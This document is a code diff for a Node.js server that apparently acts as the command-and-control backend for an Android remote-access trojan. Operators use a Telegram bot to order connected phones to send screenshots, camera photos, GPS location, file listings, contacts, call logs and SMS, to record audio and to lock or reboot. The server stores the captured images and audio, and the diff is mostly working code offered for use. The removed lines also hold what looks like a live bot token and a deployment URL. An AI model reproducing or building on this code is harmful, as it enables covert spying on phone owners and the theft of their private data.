@@ -1,326 +1,524 @@
 const express = require('express');
 const WebSocket = require('ws');
 const TelegramBot = require('node-telegram-bot-api');
+const fs = require('fs');
+const path = require('path');
 const http = require('http');
+const https = require('https');
+const crypto = require('crypto');
 
-// 🔧 الإعدادات - ضع بياناتك هنا
-const config = {
-    TELEGRAM_TOKEN: "8273593857:AAGNyv_BOdm6D-w2Z16uNBDht1jXiyn_J5o", // ضع توكن البوت هنا
-    AUTHORIZED_USERS: [7604667042], // ضع أيدي التلجرام الخاص بك هنا
-    SERVER_PORT: process.env.PORT || 3000,
-    SERVER_HOST: "0.0.0.0"
-};
+// الإعدادات الأساسية
+const TELEGRAM_TOKEN = "1234567890:ABCdefGHIjklMNopQRstUVwxYZ123456789";
+const AUTHORIZED_USERS = [123456789, 987654321];
+const SERVER_PORT = process.env.PORT || 3000;
+const SERVER_HOST = "0.0.0.0";
 
-// التحقق من البيانات
-if (config.TELEGRAM_TOKEN === "1234567890:ABCdefGHIjklMNopQRstUVwxYZ123456789") {
-    console.log("❌ يرجى تغيير التوكن في السطر 9");
-    process.exit(1);
-}
-
-if (config.AUTHORIZED_USERS[0] === 123456789) {
-    console.log("❌ يرجى تغيير أيدي التلجرام في السطر 10");
-    process.exit(1);
-}
-
+// إنشاء التطبيقات
 const app = express();
 const server = http.createServer(app);
 const wss = new WebSocket.Server({ server });
+const bot = new TelegramBot(TELEGRAM_TOKEN, { polling: true });
 
-// 🔧 إصلاح: استخدام webhook فقط بدون polling
-const bot = new TelegramBot(config.TELEGRAM_TOKEN);
-
+// تخزين البيانات
 const connectedDevices = new Map();
 const userSessions = new Map();
+const deviceCommands = new Map();
 
+// وسائط Express
 app.use(express.json());
+app.use(express.urlencoded({ extended: true }));
+app.use(express.static('public'));
 
-// 🔧 مسار ويب لفحص السيرفر
+// مسارات الويب
 app.get('/', (req, res) => {
-    const clientIP = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
-    
+    res.sendFile(path.join(__dirname, 'public', 'index.html'));
+});
+
+app.get('/admin', (req, res) => {
+    res.sendFile(path.join(__dirname, 'public', 'admin.html'));
+});
+
+app.get('/api/devices', (req, res) => {
     res.json({
-        status: '✅ السيرفر يعمل',
-        your_ip: clientIP,
-        connected_devices: Array.from(connectedDevices.keys()),
-        total_devices: connectedDevices.size,
-        webSocket: '✅ نشط',
-        telegram_bot: '✅ جاهز'
+        total: connectedDevices.size,
+        devices: Array.from(connectedDevices.entries()).map(([id, device]) => ({
+            id,
+            ip: device.ip,
+            connectedAt: device.connectedAt,
+            info: device.info
+        }))
     });
 });
 
-// 🔧 مسار لاستقبال رسائل التلجرام (webhook)
-app.post('/webhook', express.json(), (req, res) => {
-    try {
-        const update = req.body;
-        console.log('📨 رسالة من التلجرام:', update.message?.text);
-        
-        // معالجة الرسالة يدوياً
-        handleTelegramUpdate(update);
-        
-        res.sendStatus(200);
-    } catch (error) {
-        console.error('❌ خطأ في webhook:', error);
-        res.sendStatus(200);
-    }
+app.get('/api/status', (req, res) => {
+    res.json({
+        server: 'running',
+        uptime: process.uptime(),
+        memory: process.memoryUsage(),
+        devices: connectedDevices.size
+    });
 });
 
-// 🔌 اتصال WebSocket من APK
+// اتصال WebSocket من APK
 wss.on('connection', (ws, req) => {
-    // 🔧 إصلاح: الحصول على IP حقيقي من Render
-    const clientIP = req.headers['x-forwarded-for'] || 
-                    req.socket.remoteAddress;
+    const deviceId = crypto.randomBytes(8).toString('hex');
+    const clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
     
-    const deviceId = generateDeviceId();
-    
-    console.log(`🔗 اتصال WebSocket جديد`);
-    console.log(`📱 المعرف: ${deviceId}`);
-    console.log(`🌐 IP: ${clientIP}`);
-    console.log(`📡 Headers:`, JSON.stringify(req.headers, null, 2));
+    console.log(`📱 APK connected: ${deviceId} from ${clientIp}`);
     
     connectedDevices.set(deviceId, {
         ws: ws,
-        ip: clientIP,
+        ip: clientIp,
         connectedAt: new Date(),
         info: {},
-        headers: req.headers
+        lastPing: Date.now()
     });
 
-    // 🔧 إرسال رسالة ترحيب
-    setTimeout(() => {
-        try {
-            if (ws.readyState === ws.OPEN) {
-                ws.send(JSON.stringify({
-                    type: 'welcome',
-                    deviceId: deviceId,
-                    message: 'تم الاتصال بنجاح',
-                    timestamp: Date.now(),
-                    server: 'Render.com',
-                    status: 'connected'
-                }));
-                console.log(`✅ تم إرسال الترحيب لـ ${deviceId}`);
-                
-                // 🔧 طلب معلومات الجهاز
-                setTimeout(() => {
-                    sendToDevice(deviceId, {
-                        type: 'get_device_info',
-                        timestamp: Date.now()
-                    });
-                }, 1000);
-            }
-        } catch (error) {
-            console.error(`❌ فشل إرسال الترحيب:`, error);
+    // إرسال رسالة ترحيب
+    ws.send(JSON.stringify({
+        type: 'welcome',
+        deviceId: deviceId,
+        message: 'Connected successfully',
+        timestamp: Date.now(),
+        config: {
+            allowScreenshots: true,
+            allowCamera: true,
+            allowLocation: true,
+            allowFiles: true,
+            allowMicrophone: true,
+            allowCalls: true,
+            allowContacts: true,
+            allowSms: true
         }
-    }, 500);
+    }));
 
-    // 📩 استقبال البيانات من APK
+    // إرسال إشعار للتلجرام
+    sendToTelegram(`📱 New device connected\nID: ${deviceId}\nIP: ${clientIp}\nTime: ${new Date().toLocaleString()}`);
+
+    // استقبال البيانات من APK
     ws.on('message', (data) => {
         try {
             const message = JSON.parse(data);
-            console.log(`📨 من ${deviceId}: ${message.type}`, message);
-            handleAPKMessage(deviceId, message);
+            handleDeviceMessage(deviceId, message);
         } catch (error) {
-            console.error(`❌ خطأ في معالجة رسالة ${deviceId}:`, error.message);
+            console.error('Error parsing device message:', error);
         }
     });
 
     ws.on('close', () => {
-        console.log(`❌ انقطع ${deviceId}`);
+        console.log(`Device disconnected: ${deviceId}`);
         connectedDevices.delete(deviceId);
+        sendToTelegram(`❌ Device disconnected: ${deviceId}`);
     });
 
     ws.on('error', (error) => {
-        console.error(`❌ خطأ WebSocket ${deviceId}:`, error);
+        console.error(`WebSocket error for ${deviceId}:`, error);
+    });
+
+    // ping/pong للتحقق من الاتصال
+    const pingInterval = setInterval(() => {
+        if (ws.readyState === ws.OPEN) {
+            ws.send(JSON.stringify({ type: 'ping', timestamp: Date.now() }));
+        }
+    }, 30000);
+
+    ws.on('close', () => {
+        clearInterval(pingInterval);
     });
 });
 
-// ⚡ معالجة رسائل APK
-function handleAPKMessage(deviceId, message) {
+// معالجة رسائل الأجهزة
+function handleDeviceMessage(deviceId, message) {
     const device = connectedDevices.get(deviceId);
     if (!device) return;
 
+    console.log(`Message from ${deviceId}:`, message.type);
+
     switch (message.type) {
+        case 'pong':
+            device.lastPing = Date.now();
+            break;
+
         case 'device_info':
             device.info = message.data;
-            console.log(`📊 معلومات ${deviceId}:`, message.data);
-            
-            // 🔧 إرسال رسالة للتلجرام عبر HTTP
-            sendTelegramMessage(
-                `📱 **جهاز متصل جديد**\n` +
-                `🎯 المعرف: ${deviceId}\n` +
-                `📱 الموديل: ${message.data.model || 'غير معروف'}\n` +
-                `🤖 أندرويد: ${message.data.androidVersion || 'غير معروف'}\n` +
-                `🔋 البطارية: ${message.data.battery || 'غير معروف'}%\n` +
-                `🌐 IP: ${device.ip}\n` +
-                `🕒 الوقت: ${new Date().toLocaleString()}`
+            sendToTelegram(
+                `📊 Device Info - ${deviceId}\n` +
+                `Model: ${message.data.model || 'Unknown'}\n` +
+                `Android: ${message.data.androidVersion || 'Unknown'}\n` +
+                `Battery: ${message.data.battery || 'Unknown'}%\n` +
+                `Storage: ${message.data.storage || 'Unknown'}\n` +
+                `Root: ${message.data.isRooted ? 'Yes' : 'No'}`
             );
             break;
 
         case 'location':
-            console.log(`📍 موقع ${deviceId}:`, message.data);
-            sendTelegramMessage(
-                `📍 **موقع الجهاز**\n` +
-                `🎯 ${deviceId}\n` +
-                `📌 خط الطول: ${message.data.longitude}\n` +
-                `📌 خط العرض: ${message.data.latitude}\n` +
-                `🕒 ${new Date(message.timestamp).toLocaleString()}`
+            sendToTelegram(
+                `📍 Location - ${deviceId}\n` +
+                `Latitude: ${message.data.latitude}\n` +
+                `Longitude: ${message.data.longitude}\n` +
+                `Accuracy: ${message.data.accuracy || 'N/A'}m\n` +
+                `Time: ${new Date(message.timestamp).toLocaleString()}`
             );
             break;
 
         case 'screenshot_result':
-            sendTelegramMessage(
-                message.success ? 
-                `✅ تم التقاط لقطة شاشة من ${deviceId}` : 
-                `❌ فشل في لقطة الشاشة من ${deviceId}`
-            );
+            if (message.success && message.imageData) {
+                // حفظ الصورة وإرسالها
+                const screenshotPath = `screenshots/${deviceId}_${Date.now()}.jpg`;
+                fs.writeFileSync(screenshotPath, Buffer.from(message.imageData, 'base64'));
+                sendToTelegram(`✅ Screenshot captured from ${deviceId}`);
+                // يمكن إرسال الصورة هنا إذا دعم البوت
+            } else {
+                sendToTelegram(`❌ Screenshot failed from ${deviceId}`);
+            }
             break;
 
         case 'camera_result':
-            if (message.success) {
-                sendTelegramMessage(`✅ تم التقاط صورة من الكاميرا ${deviceId}`);
+            if (message.success && message.imageData) {
+                const cameraPath = `camera/${deviceId}_${Date.now()}.jpg`;
+                fs.writeFileSync(cameraPath, Buffer.from(message.imageData, 'base64'));
+                sendToTelegram(`✅ Camera photo captured from ${deviceId}`);
             }
             break;
 
         case 'file_list':
-            const files = message.data?.files || [];
-            sendTelegramMessage(
-                `📁 ملفات ${deviceId}\n` +
-                files.slice(0, 5).map(f => `📄 ${f}`).join('\n') +
-                (files.length > 5 ? `\n... و ${files.length - 5} ملفات أخرى` : '')
+            const files = message.data.files || [];
+            sendToTelegram(
+                `📁 Files - ${deviceId}\n` +
+                files.slice(0, 15).map(f => `📄 ${f}`).join('\n') +
+                (files.length > 15 ? `\n... and ${files.length - 15} more files` : '')
             );
             break;
 
-        default:
-            console.log(`📨 رسالة غير معروفة من ${deviceId}:`, message);
+        case 'contacts_list':
+            const contacts = message.data.contacts || [];
+            sendToTelegram(
+                `👥 Contacts - ${deviceId}\n` +
+                contacts.slice(0, 10).map(c => `👤 ${c.name}: ${c.number}`).join('\n') +
+                (contacts.length > 10 ? `\n... and ${contacts.length - 10} more contacts` : '')
+            );
+            break;
+
+        case 'calls_list':
+            const calls = message.data.calls || [];
+            sendToTelegram(
+                `📞 Call Logs - ${deviceId}\n` +
+                calls.slice(0, 10).map(c => `📞 ${c.number} (${c.type}) - ${c.duration}`).join('\n')
+            );
+            break;
+
+        case 'sms_list':
+            const sms = message.data.sms || [];
+            sendToTelegram(
+                `💬 SMS - ${deviceId}\n` +
+                sms.slice(0, 10).map(s => `💬 ${s.number}: ${s.message.substring(0, 50)}`).join('\n')
+            );
+            break;
+
+        case 'microphone_result':
+            if (message.success && message.audioData) {
+                const audioPath = `audio/${deviceId}_${Date.now()}.wav`;
+                fs.writeFileSync(audioPath, Buffer.from(message.audioData, 'base64'));
+                sendToTelegram(`🎤 Audio recorded from ${deviceId}`);
+            }
+            break;
+
+        case 'command_result':
+            if (message.commandId && deviceCommands.has(message.commandId)) {
+                const { resolve } = deviceCommands.get(message.commandId);
+                resolve(message);
+                deviceCommands.delete(message.commandId);
+            }
+            break;
+
+        case 'error':
+            sendToTelegram(`❌ Error from ${deviceId}: ${message.error}`);
+            break;
     }
 }
 
-// 🤖 معالجة رسائل التلجرام يدوياً
-function handleTelegramUpdate(update) {
-    if (!update.message) return;
+// أوامر التلجرام
+bot.onText(/\/start/, (msg) => {
+    const chatId = msg.chat.id;
     
-    const chatId = update.message.chat.id;
-    const text = update.message.text;
-    
-    if (!config.AUTHORIZED_USERS.includes(chatId)) {
-        return sendTelegramToUser(chatId, '❌ غير مصرح لك بالوصول');
+    if (!AUTHORIZED_USERS.includes(chatId)) {
+        return bot.sendMessage(chatId, '❌ Unauthorized access');
     }
 
-    console.log(`🤖 معالجة أمر: ${text} من ${chatId}`);
+    const keyboard = {
+        reply_markup: {
+            keyboard: [
+                ['📊 Server Status', '📋 Connected Devices'],
+                ['🖼️ Take Screenshot', '📍 Get Location'],
+                ['📁 List Files', '📷 Take Camera Photo'],
+                ['👥 Get Contacts', '📞 Get Call Logs'],
+                ['💬 Get SMS', '🎤 Record Audio'],
+                ['🔒 Lock Device', '🔄 Reboot Device'],
+                ['📱 Device Info', '⚙️ Settings']
+            ],
+            resize_keyboard: true
+        }
+    };
 
-    // معالجة الأوامر
-    if (text === '/start') {
-        sendTelegramToUser(chatId,
-            `🎮 **مرحباً بك في نظام التحكم**\n\n` +
-            `الأجهزة المتصلة: ${connectedDevices.size}\n\n` +
-            `استخدم:\n` +
-            `/devices - لعرض الأجهزة\n` +
-            `/screen device_id - لقطة شاشة\n` +
-            `/location device_id - الموقع\n` +
-            `/files device_id - الملفات\n` +
-            `/camera device_id - الكاميرا`
-        );
+    bot.sendMessage(chatId, 
+        `🎮 **Remote Control System**\n\n` +
+        `Welcome to your remote control dashboard.\n` +
+        `Use the buttons below to control connected devices.\n\n` +
+        `Connected devices: ${connectedDevices.size}`,
+        { parse_mode: 'Markdown', ...keyboard }
+    );
+});
+
+// حالة السيرفر
+bot.onText(/📊 Server Status/, (msg) => {
+    const chatId = msg.chat.id;
+    if (!AUTHORIZED_USERS.includes(chatId)) return;
+
+    bot.sendMessage(chatId,
+        `📊 **Server Status**\n` +
+        `🖥️ Server: ✅ Running\n` +
+        `📱 Devices: ${connectedDevices.size} connected\n` +
+        `⏰ Uptime: ${formatUptime(process.uptime())}\n` +
+        `💾 Memory: ${Math.round(process.memoryUsage().rss / 1024 / 1024)}MB\n` +
+        `🔐 Users: ${AUTHORIZED_USERS.length} authorized`,
+        { parse_mode: 'Markdown' }
+    );
+});
+
+// قائمة الأجهزة
+bot.onText(/📋 Connected Devices/, (msg) => {
+    const chatId = msg.chat.id;
+    if (!AUTHORIZED_USERS.includes(chatId)) return;
+
+    if (connectedDevices.size === 0) {
+        return bot.sendMessage(chatId, '❌ No devices connected');
     }
-    else if (text === '/devices') {
-        if (connectedDevices.size === 0) {
-            sendTelegramToUser(chatId, '❌ لا توجد أجهزة متصلة');
-        } else {
-            let devicesList = '📱 **الأجهزة المتصلة:**\n\n';
-            connectedDevices.forEach((device, deviceId) => {
-                devicesList += `🔹 ${deviceId}\n📍 ${device.ip}\n\n`;
+
+    const devicesKeyboard = {
+        reply_markup: {
+            keyboard: [
+                ...Array.from(connectedDevices.keys()).map(deviceId => [`🎯 ${deviceId}`]),
+                ['↩️ Back to Main']
+            ],
+            resize_keyboard: true
+        }
+    };
+
+    let devicesList = '📱 **Connected Devices:**\n\n';
+    connectedDevices.forEach((device, deviceId) => {
+        devicesList += `🔹 ${deviceId}\n`;
+        devicesList += `   📍 IP: ${device.ip}\n`;
+        devicesList += `   ⏰ Connected: ${formatTimeDiff(device.connectedAt)}\n`;
+        if (device.info.model) {
+            devicesList += `   📱 ${device.info.model}\n`;
+        }
+        devicesList += `\n`;
+    });
+
+    userSessions.set(chatId, { step: 'select_device' });
+
+    bot.sendMessage(chatId, devicesList, { 
+        parse_mode: 'Markdown',
+        ...devicesKeyboard 
+    });
+});
+
+// معالجة اختيار الجهاز
+bot.on('message', (msg) => {
+    const chatId = msg.chat.id;
+    if (!AUTHORIZED_USERS.includes(chatId)) return;
+
+    const text = msg.text;
+    const session = userSessions.get(chatId) || {};
+
+    // اختيار جهاز
+    if (session.step === 'select_device' && text.startsWith('🎯 ')) {
+        const deviceId = text.replace('🎯 ', '');
+        if (connectedDevices.has(deviceId)) {
+            userSessions.set(chatId, { 
+                step: 'device_selected', 
+                selectedDevice: deviceId 
             });
-            sendTelegramToUser(chatId, devicesList);
+
+            const controlKeyboard = {
+                reply_markup: {
+                    keyboard: [
+                        ['🖼️ Take Screenshot', '📍 Get Location'],
+                        ['📁 List Files', '📷 Take Camera Photo'],
+                        ['👥 Get Contacts', '📞 Get Call Logs'],
+                        ['💬 Get SMS', '🎤 Record Audio'],
+                        ['🔒 Lock Device', '🔄 Reboot Device'],
+                        ['📱 Device Info', '↩️ Back to Devices']
+                    ],
+                    resize_keyboard: true
+                }
+            };
+
+            bot.sendMessage(chatId, 
+                `🎯 **Selected Device:** ${deviceId}\n\n` +
+                `Choose an action to perform:`,
+                { parse_mode: 'Markdown', ...controlKeyboard }
+            );
         }
     }
-    else if (text.startsWith('/screen ')) {
-        const deviceId = text.replace('/screen ', '').trim();
-        const success = sendToDevice(deviceId, { type: 'take_screenshot' });
-        sendTelegramToUser(chatId, 
-            success ? `📸 جاري أخذ لقطة من ${deviceId}...` : `❌ ${deviceId} غير متصل`
-        );
-    }
-    else if (text.startsWith('/location ')) {
-        const deviceId = text.replace('/location ', '').trim();
-        const success = sendToDevice(deviceId, { type: 'get_location' });
-        sendTelegramToUser(chatId, 
-            success ? `📍 جاري الحصول على موقع ${deviceId}...` : `❌ ${deviceId} غير متصل`
-        );
-    }
-    else if (text.startsWith('/files ')) {
-        const deviceId = text.replace('/files ', '').trim();
-        const success = sendToDevice(deviceId, { type: 'list_files', path: '/sdcard/' });
-        sendTelegramToUser(chatId, 
-            success ? `📁 جاري استعراض ملفات ${deviceId}...` : `❌ ${deviceId} غير متصل`
-        );
-    }
-    else if (text.startsWith('/camera ')) {
-        const deviceId = text.replace('/camera ', '').trim();
-        const success = sendToDevice(deviceId, { type: 'take_camera_photo', camera: 'back' });
-        sendTelegramToUser(chatId, 
-            success ? `📷 جاري التقاط صورة من ${deviceId}...` : `❌ ${deviceId} غير متصل`
-        );
-    }
-}
 
-// ⚡ إرسال أمر لجهاز
+    // الرجوع للقائمة الرئيسية
+    if (text === '↩️ Back to Main') {
+        userSessions.set(chatId, {});
+        const mainKeyboard = {
+            reply_markup: {
+                keyboard: [
+                    ['📊 Server Status', '📋 Connected Devices'],
+                    ['🖼️ Take Screenshot', '📍 Get Location'],
+                    ['📁 List Files', '📷 Take Camera Photo'],
+                    ['👥 Get Contacts', '📞 Get Call Logs'],
+                    ['💬 Get SMS', '🎤 Record Audio'],
+                    ['🔒 Lock Device', '🔄 Reboot Device'],
+                    ['📱 Device Info', '⚙️ Settings']
+                ],
+                resize_keyboard: true
+            }
+        };
+        bot.sendMessage(chatId, '🏠 Main Menu', mainKeyboard);
+    }
+
+    // الرجوع لقائمة الأجهزة
+    if (text === '↩️ Back to Devices') {
+        userSessions.set(chatId, { step: 'select_device' });
+        
+        const devicesKeyboard = {
+            reply_markup: {
+                keyboard: [
+                    ...Array.from(connectedDevices.keys()).map(deviceId => [`🎯 ${deviceId}`]),
+                    ['↩️ Back to Main']
+                ],
+                resize_keyboard: true
+            }
+        };
+
+        bot.sendMessage(chatId, '📱 Select a device:', devicesKeyboard);
+    }
+
+    // الأوامر عندما يكون جهاز محدد
+    if (session.step === 'device_selected' && session.selectedDevice) {
+        const deviceId = session.selectedDevice;
+        
+        if (text === '🖼️ Take Screenshot') {
+            sendToDevice(deviceId, { type: 'take_screenshot', quality: 85 });
+            bot.sendMessage(chatId, `📸 Taking screenshot from ${deviceId}...`);
+        }
+        else if (text === '📍 Get Location') {
+            sendToDevice(deviceId, { type: 'get_location' });
+            bot.sendMessage(chatId, `📍 Getting location from ${deviceId}...`);
+        }
+        else if (text === '📁 List Files') {
+            sendToDevice(deviceId, { type: 'list_files', path: '/sdcard/' });
+            bot.sendMessage(chatId, `📁 Listing files from ${deviceId}...`);
+        }
+        else if (text === '📷 Take Camera Photo') {
+            sendToDevice(deviceId, { type: 'take_camera_photo', camera: 'back' });
+            bot.sendMessage(chatId, `📷 Taking camera photo from ${deviceId}...`);
+        }
+        else if (text === '👥 Get Contacts') {
+            sendToDevice(deviceId, { type: 'get_contacts' });
+            bot.sendMessage(chatId, `👥 Getting contacts from ${deviceId}...`);
+        }
+        else if (text === '📞 Get Call Logs') {
+            sendToDevice(deviceId, { type: 'get_call_logs', limit: 50 });
+            bot.sendMessage(chatId, `📞 Getting call logs from ${deviceId}...`);
+        }
+        else if (text === '💬 Get SMS') {
+            sendToDevice(deviceId, { type: 'get_sms', limit: 50 });
+            bot.sendMessage(chatId, `💬 Getting SMS from ${deviceId}...`);
+        }
+        else if (text === '🎤 Record Audio') {
+            sendToDevice(deviceId, { type: 'record_audio', duration: 30000 });
+            bot.sendMessage(chatId, `🎤 Recording audio from ${deviceId}...`);
+        }
+        else if (text === '🔒 Lock Device') {
+            sendToDevice(deviceId, { type: 'lock_device' });
+            bot.sendMessage(chatId, `🔒 Locking device ${deviceId}...`);
+        }
+        else if (text === '🔄 Reboot Device') {
+            sendToDevice(deviceId, { type: 'reboot_device' });
+            bot.sendMessage(chatId, `🔄 Rebooting device ${deviceId}...`);
+        }
+        else if (text === '📱 Device Info') {
+            sendToDevice(deviceId, { type: 'get_device_info' });
+            bot.sendMessage(chatId, `📱 Getting device info from ${deviceId}...`);
+        }
+    }
+});
+
+// إرسال أمر لجهاز
 function sendToDevice(deviceId, command) {
     const device = connectedDevices.get(deviceId);
     if (!device || !device.ws || device.ws.readyState !== WebSocket.OPEN) {
-        console.log(`❌ ${deviceId} غير متصل`);
+        sendToTelegram(`❌ Device ${deviceId} is not connected`);
         return false;
     }
 
     try {
+        const commandId = crypto.randomBytes(4).toString('hex');
+        command.commandId = commandId;
+        
         device.ws.send(JSON.stringify(command));
-        console.log(`✅ تم إرسال ${command.type} لـ ${deviceId}`);
+        console.log(`Command sent to ${deviceId}:`, command.type);
         return true;
     } catch (error) {
-        console.error(`❌ فشل إرسال لـ ${deviceId}:`, error);
+        console.error(`Failed to send command to ${deviceId}:`, error);
+        sendToTelegram(`❌ Failed to send command to ${deviceId}`);
         return false;
     }
 }
 
-// 📨 إرسال رسالة للتلجرام عبر HTTP
-function sendTelegramMessage(message) {
-    config.AUTHORIZED_USERS.forEach(userId => {
-        sendTelegramToUser(userId, message);
+// إرسال رسالة للتلجرام
+function sendToTelegram(message) {
+    AUTHORIZED_USERS.forEach(userId => {
+        bot.sendMessage(userId, message, { parse_mode: 'Markdown' }).catch(err => {
+            console.error('Failed to send Telegram message:', err);
+        });
     });
 }
 
-function sendTelegramToUser(chatId, message) {
-    fetch(`https://api.telegram.org/bot${config.TELEGRAM_TOKEN}/sendMessage`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-            chat_id: chatId,
-            text: message,
-            parse_mode: 'Markdown'
-        })
-    })
-    .then(response => response.json())
-    .then(data => {
-        if (!data.ok) {
-            console.error('❌ فشل إرسال للتلجرام:', data);
-        }
-    })
-    .catch(error => {
-        console.error('❌ خطأ في إرسال للتلجرام:', error);
-    });
+// وظائف مساعدة
+function formatUptime(seconds) {
+    const days = Math.floor(seconds / 86400);
+    const hours = Math.floor((seconds % 86400) / 3600);
+    const minutes = Math.floor((seconds % 3600) / 60);
+    return `${days}d ${hours}h ${minutes}m`;
 }
 
-// 🛠️ وظائف مساعدة
-function generateDeviceId() {
-    return 'device_' + Math.random().toString(36).substring(2, 8);
+function formatTimeDiff(date) {
+    const diff = Date.now() - date.getTime();
+    const minutes = Math.floor(diff / 60000);
+    if (minutes < 60) return `${minutes} minutes ago`;
+    const hours = Math.floor(minutes / 60);
+    if (hours < 24) return `${hours} hours ago`;
+    const days = Math.floor(hours / 24);
+    return `${days} days ago`;
 }
 
-// 🚀 بدء السيرفر
-server.listen(config.SERVER_PORT, config.SERVER_HOST, () => {
-    console.log(`✅ السيرفر يعمل على: http://${config.SERVER_HOST}:${config.SERVER_PORT}`);
-    console.log(`🤖 بوت التلجرام جاهز (Webhook)`);
-    console.log(`📱 جاهز لاستقبال اتصالات APK`);
-    console.log(`🔗 رابط WebSocket: wss://bot-d4k2.onrender.com`);
-    console.log(`🌐 للفحص: https://bot-d4k2.onrender.com`);
+// التأكد من وجود المجلدات
+['screenshots', 'camera', 'audio'].forEach(dir => {
+    if (!fs.existsSync(dir)) {
+        fs.mkdirSync(dir, { recursive: true });
+    }
 });
 
+// بدء السيرفر
+server.listen(SERVER_PORT, SERVER_HOST, () => {
+    console.log(`🚀 Server running on: http://${SERVER_HOST}:${SERVER_PORT}`);
+    console.log(`🤖 Telegram bot ready`);
+    console.log(`📱 Ready for APK connections`);
+    console.log(`🔗 WebSocket: ws://${SERVER_HOST}:${SERVER_PORT}`);
+});
+
+// معالجة الأخطاء
 process.on('uncaughtException', (error) => {
-    console.error('❌ خطأ غير متوقع:', error);
+    console.error('Uncaught Exception:', error);
+});
+
+process.on('unhandledRejection', (reason, promise) => {
+    console.error('Unhandled Rejection:', reason);
 });
